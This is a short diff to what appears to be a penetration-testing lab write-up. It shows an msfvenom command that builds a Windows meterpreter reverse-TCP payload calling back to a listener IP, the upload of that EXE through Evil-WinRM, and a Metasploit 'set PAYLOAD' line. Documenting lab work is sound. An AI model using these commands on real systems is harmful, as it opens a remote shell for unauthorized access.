@@ -412,7 +412,12 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.250.11 LPORT=9005 -
 
 ![[Pasted image 20250512200042.png]]
 
-We uploaded the EXE using the upload command in Evil-WinRM and configured msfconsole accordingly.
+We uploaded the EXE using the upload command in Evil-WinRM and configured msfconsole accordingly. It’s important to use the same payload in Metasploit as the one used when generating the EXE with msfvenom.
+
+```python
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+```
+
 ![[Pasted image 20250512201912.png]]
 
 ![[Pasted image 20250512201519.png]]
